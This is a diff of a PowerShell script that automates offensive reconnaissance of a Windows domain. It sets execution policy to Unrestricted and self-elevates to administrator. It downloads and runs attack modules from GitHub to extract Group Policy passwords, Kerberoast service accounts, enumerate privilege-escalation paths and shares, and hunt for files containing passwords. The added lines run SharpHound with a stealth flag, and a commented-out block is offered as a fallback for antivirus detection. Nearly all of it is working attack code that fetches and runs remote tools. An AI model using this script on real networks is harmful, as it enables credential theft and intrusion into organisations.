@@ -7,7 +7,7 @@ Write-Host "##                                                                  
 Write-Host "##   If you see errors, that's normal. Unless your computer bluescreens or something. That's not normal. ##" -ForegroundColor Green
 Write-Host "###########################################################################################################" -ForegroundColor Green
 Set-ExecutionPolicy Unrestricted
-#run as Admin, if possible
+#run as Admin check
 If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {   
 $arguments = "& '" + $myinvocation.mycommand.definition + "'"
@@ -30,22 +30,6 @@ else
 $modulepath=$env:psmodulepath.split(';')[0].split(' ')
 Write-Host "Using Module path: $modulepath" -ForegroundColor Green
 
-#create GPP PS module folder
-If(!(test-path $modulepath/GPP))
-{
-      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
-}
-#check for GPP passwords
-Write-Host "Fetching GPPP module..." 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.ps1")
-#import module
-Write-Host "Importing module..." 
-Import-Module gpp.ps1
-#Run GPP. Verbose enabled so you know it's actually working or not
-Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
-Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
-
 #create kerberoast PS module folder
 If(!(test-path $modulepath/Kerberoast))
 {
@@ -62,18 +46,35 @@ Import-Module Kerberoast.ps1
 Write-Host "Running Kerberoast" -ForegroundColor  Yellow
 Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
 
-#SharpHound
-If(!(test-path $modulepath/SharpHound))
+#BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
+<#
+If(!(test-path $modulepath/Sharp))
 {
-      New-Item -ItemType Directory -Force -Path $modulepath/SharpHound | Out-Null
+      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
 }
 Write-Host "Fetching SharpHound module..." 
-$client = New-Object System.Net.WebClient
-$client.DownloadFile("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1","$modulepath/SharpHound/SharpHound.ps1")
+$download = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/1.5/Ingestors/SharpHound.ps1")
+$Encode = [System.Text.Encoding]::Unicode.GetBytes(($download))
+$Base64 = [Convert]::ToBase64String($Encode)
+$Decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Base64))
+$Decoded > $modulepath/Sharp/Sharp.ps1
 Write-Host "Importing module..." 
-Import-Module SharpHound.ps1
+Import-Module Sharp.ps1
 Write-Host "Running SharpHound" -ForegroundColor  Yellow
-Invoke-BloodHound -CSVFolder C:\Capture | Out-Null
+Invoke-BloodHound -CSVFolder $path | Out-Null
+#>
+
+#BloodHound EXE method
+If(!(test-path $modulepath/Sharp))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/Sharp | Out-Null
+}
+Write-Host "Fetching Sharphound.exe..."
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://github.com/BloodHoundAD/BloodHound/blob/1.5/Ingestors/SharpHound.exe?raw=true","$modulepath/Sharp/Sharp.exe")
+Write-Host "Running SharpHound" -ForegroundColor  Yellow
+& "$modulepath/Sharp/Sharp.exe" --Stealth --CSVFolder $path
 
 #PrivEsc
 If(!(test-path $modulepath/PrivEsc))
@@ -87,6 +88,22 @@ Write-Host "Importing module..."
 Import-Module PrivEsc.ps1
 Write-Host "Checking for Privilege Escalation paths...." -ForegroundColor Yellow
 Invoke-AllChecks | Out-File $path\PrivEsc.txt
+
+#create GPP PS module folder
+If(!(test-path $modulepath/GPP))
+{
+      New-Item -ItemType Directory -Force -Path $modulepath/GPP | Out-Null
+}
+#check for GPP passwords
+Write-Host "Fetching GPPP module..." 
+$client = New-Object System.Net.WebClient
+$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-GPPPassword.ps1","$modulepath/GPP/GPP.ps1")
+#import module
+Write-Host "Importing module..." 
+Import-Module gpp.ps1
+#Run GPP. Verbose enabled so you know it's actually working or not
+Write-Host "Checking for GPP Passwords, this usually takes a few minutes." -ForegroundColor Yellow
+Get-GPPPassword -Verbose | Out-File $path\gpp.txt 
 
 #PowerView
 If(!(test-path $modulepath/PowerView))
@@ -102,7 +119,7 @@ Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
 Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
 Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
 #Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
-Invoke-FileFinder -Verbose -Terms ccn,cvv,ssn,password,secret -OutFile $path\FileFinder.txt
+Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
 Write-Host "Checking for exploitable systems..." -ForegroundColor Yellow
 Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
 
